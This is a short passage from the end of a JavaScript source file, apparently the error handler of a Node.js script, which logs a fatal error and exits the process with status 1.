  console.error("FATAL:", e);
  process.exit(1);
});
